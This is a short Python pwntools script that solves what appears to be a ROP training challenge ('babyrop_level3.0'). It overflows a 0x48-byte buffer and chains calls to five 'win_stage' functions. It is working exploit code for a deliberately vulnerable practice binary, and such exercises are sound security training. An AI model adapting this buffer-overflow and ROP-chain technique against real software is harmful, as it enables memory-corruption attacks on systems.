from pwn import * 

context.arch = "amd64"

elf = ELF("/challenge/babyrop_level3.0")
io = elf.process()

buff_offset = int("48", 16)

# Devo trovare i gadget
rop = ROP("/challenge/babyrop_level3.0")

pop_rdi = rop.rdi.address

rop.win_stage_1(1)
rop.win_stage_2(2)
rop.win_stage_3(3)
rop.win_stage_4(4)
rop.win_stage_5(5)

p = b'A'*buff_offset + rop.chain()

io.sendline(p)

io.interactive()
